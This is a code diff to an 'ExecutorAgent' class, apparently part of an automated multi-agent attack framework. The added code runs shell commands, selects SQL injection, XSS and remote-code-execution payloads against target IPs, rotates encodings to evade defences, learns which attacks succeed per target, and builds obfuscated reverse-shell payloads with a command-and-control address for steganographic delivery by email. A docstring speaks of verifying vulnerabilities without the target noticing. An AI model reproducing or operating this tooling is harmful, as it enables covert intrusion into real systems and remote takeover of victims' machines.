@@ -4,6 +4,9 @@ from tools.game_client_control import GameClientControl
 from tools.network_sniffer import NetworkSniffer
 from tools.verification import get_verification
 from tools.stego_builder import create_stego_package
+from tools.payload_manager import PayloadManager
+from tools.steganography_tool import SteganographyTool
+from tools.observability import StructuredLogger, PerformanceMonitor, MetricsCollector
 from config import PAYLOAD_CONFIG
 import json
 import time
@@ -13,7 +16,24 @@ import random
 class ExecutorAgent(BaseAgent):
     def __init__(self, redis_manager, config):
         super().__init__(redis_manager, config)
+        
+        # Initialize intelligent components
+        self.payload_manager = PayloadManager(redis_manager)
+        self.stego_tool = SteganographyTool()
+        
+        # Initialize observability
+        self.logger = StructuredLogger(self.name, redis_manager=redis_manager)
+        self.metrics = MetricsCollector(redis_manager)
+        self.monitor = PerformanceMonitor(self.metrics)
+        
+        # Legacy payload loading (for backward compatibility)
         self.payload_lists = self._load_all_payloads()
+        
+        # Intelligence: Track attack patterns and success rates
+        self.attack_history = []
+        self.success_patterns = {}
+        
+        self.logger.info("ExecutorAgent initialized with intelligent components")
 
     def _load_all_payloads(self):
         """Load all types of payloads from configured files."""
@@ -88,17 +108,31 @@ class ExecutorAgent(BaseAgent):
                 pass
 
     def execute_terminal_command(self, payload: dict):
-        """Executes a shell command (e.g., Nmap, custom script)."""
+        """Executes a shell command with intelligent monitoring."""
         command = payload.get('command')
         if command:
-            self.log(f"Running terminal command: {command}")
-            code, stdout, stderr = TerminalWrapper.run_command(command)
-            
-            # Report results back to Redis for the Planner to analyze
-            result_message = f"TERMINAL_RESULT: Command '{command}' finished with code {code}. STDOUT: {stdout[:500]} | STDERR: {stderr[:500]}"
-            self.redis_manager.log_observation(self.name, result_message)
+            # Monitor performance
+            with self.monitor.measure('terminal_command', tags={'command': command[:50]}):
+                self.logger.log_action('TERMINAL_COMMAND', target=command[:100], result='started')
+                
+                code, stdout, stderr = TerminalWrapper.run_command(command)
+                
+                # Analyze result intelligently
+                success = (code == 0)
+                self.metrics.record_counter('terminal_commands_total', tags={'success': str(success)})
+                
+                # Report results
+                result_message = f"TERMINAL_RESULT: Command '{command}' finished with code {code}. STDOUT: {stdout[:500]} | STDERR: {stderr[:500]}"
+                self.redis_manager.log_observation(self.name, result_message)
+                
+                self.logger.log_action(
+                    'TERMINAL_COMMAND',
+                    target=command[:100],
+                    result='success' if success else 'failed',
+                    exit_code=code
+                )
         else:
-            self.log("Terminal command payload missing 'command'.")
+            self.logger.warning("Terminal command payload missing 'command'")
 
     def execute_game_client_command(self, action_type: str, payload: dict):
         """Controls the game client (e.g., click, type, launch)."""
@@ -112,20 +146,46 @@ class ExecutorAgent(BaseAgent):
             self.log(f"Unknown game client action type: {action_type}")
 
     def execute_network_command(self, action_type: str, payload: dict):
-        """Sends a custom network packet (Exploit/Fuzzing)."""
+        """Sends a custom network packet with intelligent payload selection."""
         if action_type == 'SEND_PACKET':
             target_ip = payload.get('ip')
             target_port = payload.get('port')
             payload_hex = payload.get('payload_hex')
             protocol = payload.get('protocol', 'TCP')
+            attack_type = payload.get('attack_type', 'fuzzing')
             
-            if target_ip and target_port and payload_hex:
-                success = NetworkSniffer.send_packet(target_ip, target_port, payload_hex, protocol)
-                self.redis_manager.log_observation(self.name, f"NETWORK_SEND_RESULT: Success={success}. Sent {len(payload_hex)//2} bytes to {target_ip}:{target_port}")
+            if target_ip and target_port:
+                # Intelligent payload selection if not provided
+                if not payload_hex and attack_type in ['sqli', 'xss', 'rce', 'fuzzing']:
+                    smart_payload = self._select_intelligent_payload(attack_type, target_ip, target_port)
+                    payload_hex = smart_payload.encode().hex() if smart_payload else payload_hex
+                    self.logger.info(f"Selected intelligent payload for {attack_type}: {smart_payload[:50]}...")
+                
+                if payload_hex:
+                    with self.monitor.measure('network_attack', tags={'type': attack_type}):
+                        success = NetworkSniffer.send_packet(target_ip, target_port, payload_hex, protocol)
+                        
+                        # Record attack result
+                        self._record_attack_result(attack_type, target_ip, target_port, success, payload_hex)
+                        
+                        self.logger.log_attack(
+                            attack_type=attack_type,
+                            target=f"{target_ip}:{target_port}",
+                            payload=payload_hex[:100],
+                            success=success,
+                            protocol=protocol
+                        )
+                        
+                        self.redis_manager.log_observation(
+                            self.name,
+                            f"NETWORK_SEND_RESULT: Success={success}. Sent {len(payload_hex)//2} bytes to {target_ip}:{target_port}"
+                        )
+                else:
+                    self.logger.warning("Network send command payload incomplete")
             else:
-                self.log("Network send command payload incomplete.")
+                self.logger.warning("Network send command missing target info")
         else:
-            self.log(f"Unknown network action type: {action_type}")
+            self.logger.warning(f"Unknown network action type: {action_type}")
     
     def execute_stealth_verification(self, payload: dict):
         """Execute stealth verification - ยืนยันช่องโหว่โดยไม่ให้เป้าหมายรู้ตัว"""
@@ -246,3 +306,143 @@ class ExecutorAgent(BaseAgent):
                 self.name,
                 "STEGO_PACKAGE_FAILED: Failed to create the steganography package."
             )
+
+    def _select_intelligent_payload(self, attack_type: str, target_ip: str, target_port: int) -> str:
+        """
+        Intelligently select payload based on:
+        - Attack history
+        - Success patterns
+        - Target characteristics
+        """
+        # Check if we have successful patterns for this target
+        target_key = f"{target_ip}:{target_port}"
+        
+        if target_key in self.success_patterns and attack_type in self.success_patterns[target_key]:
+            # Use previously successful payload pattern
+            successful_pattern = self.success_patterns[target_key][attack_type]
+            self.logger.info(f"Using successful pattern for {target_key}: {successful_pattern['pattern']}")
+            payload = self.payload_manager.get_payload(attack_type, encoding=successful_pattern.get('encoding'))
+        else:
+            # Try different encoding strategies based on attack type
+            encoding_strategy = self._determine_encoding_strategy(attack_type, target_ip)
+            payload = self.payload_manager.get_payload(attack_type, encoding=encoding_strategy)
+            self.logger.info(f"Using encoding strategy '{encoding_strategy}' for {attack_type}")
+        
+        return payload if payload else ""
+    
+    def _determine_encoding_strategy(self, attack_type: str, target_ip: str) -> str:
+        """Determine best encoding strategy based on attack type and target"""
+        # Intelligence: Adapt encoding based on what we know about the target
+        strategies = {
+            'sqli': ['url', 'none', 'hex'],
+            'xss': ['html', 'url', 'none'],
+            'rce': ['base64', 'url', 'none'],
+            'fuzzing': ['none', 'hex']
+        }
+        
+        # Rotate through strategies if previous attempts failed
+        available_strategies = strategies.get(attack_type, ['none'])
+        
+        # Simple rotation based on history
+        attempt_count = len([h for h in self.attack_history if h['type'] == attack_type and h['target'] == target_ip])
+        selected_strategy = available_strategies[attempt_count % len(available_strategies)]
+        
+        return selected_strategy
+    
+    def _record_attack_result(self, attack_type: str, target_ip: str, target_port: int, 
+                             success: bool, payload_hex: str):
+        """Record attack result for learning"""
+        result = {
+            'type': attack_type,
+            'target': target_ip,
+            'port': target_port,
+            'success': success,
+            'payload_preview': payload_hex[:100],
+            'timestamp': time.time()
+        }
+        
+        self.attack_history.append(result)
+        
+        # Keep only last 1000 attacks
+        if len(self.attack_history) > 1000:
+            self.attack_history = self.attack_history[-1000:]
+        
+        # Update success patterns
+        if success:
+            target_key = f"{target_ip}:{target_port}"
+            if target_key not in self.success_patterns:
+                self.success_patterns[target_key] = {}
+            
+            self.success_patterns[target_key][attack_type] = {
+                'pattern': payload_hex[:100],
+                'encoding': 'hex',  # We know it's hex from the variable name
+                'success_count': self.success_patterns[target_key].get(attack_type, {}).get('success_count', 0) + 1
+            }
+        
+        # Record in payload manager
+        self.payload_manager.record_result(
+            payload=payload_hex[:100],
+            payload_type=attack_type,
+            success=success,
+            details=f"Target: {target_ip}:{target_port}"
+        )
+        
+        # Record metrics
+        self.metrics.record_counter(
+            f'{attack_type}_attacks_total',
+            tags={'success': str(success), 'target': target_ip}
+        )
+    
+    def _create_intelligent_stego_payload(self, target_info: dict) -> str:
+        """Create steganography payload intelligently based on target"""
+        self.logger.info("Creating intelligent steganography payload...")
+        
+        # Determine best payload based on target
+        c2_ip = target_info.get('c2_ip', '127.0.0.1')
+        c2_port = target_info.get('c2_port', 4444)
+        delivery_method = target_info.get('delivery_method', 'email')
+        
+        # Generate reverse shell payload
+        shell_payload = self.stego_tool.create_reverse_shell_payload(
+            c2_ip=c2_ip,
+            c2_port=c2_port,
+            obfuscate=True
+        )
+        
+        self.logger.info(f"Generated reverse shell payload: {len(shell_payload)} bytes")
+        
+        return shell_payload
+    
+    def _analyze_execution_context(self, action: dict) -> dict:
+        """
+        Analyze execution context to make intelligent decisions
+        Returns context analysis with recommendations
+        """
+        action_type = action.get('action_type')
+        target_agent = action.get('target_agent')
+        payload = action.get('payload', {})
+        
+        # Analyze based on recent history
+        recent_failures = [h for h in self.attack_history[-10:] if not h['success']]
+        recent_successes = [h for h in self.attack_history[-10:] if h['success']]
+        
+        success_rate = len(recent_successes) / max(len(self.attack_history[-10:]), 1)
+        
+        context = {
+            'action_type': action_type,
+            'target_agent': target_agent,
+            'recent_success_rate': success_rate,
+            'should_be_cautious': success_rate < 0.3,
+            'should_be_aggressive': success_rate > 0.7,
+            'recommendation': 'proceed'
+        }
+        
+        # Make recommendations
+        if context['should_be_cautious']:
+            context['recommendation'] = 'use_stealth'
+            self.logger.warning(f"Low success rate ({success_rate:.2%}), recommending stealth mode")
+        elif len(recent_failures) >= 3:
+            context['recommendation'] = 'change_strategy'
+            self.logger.warning("Multiple recent failures, recommending strategy change")
+        
+        return context
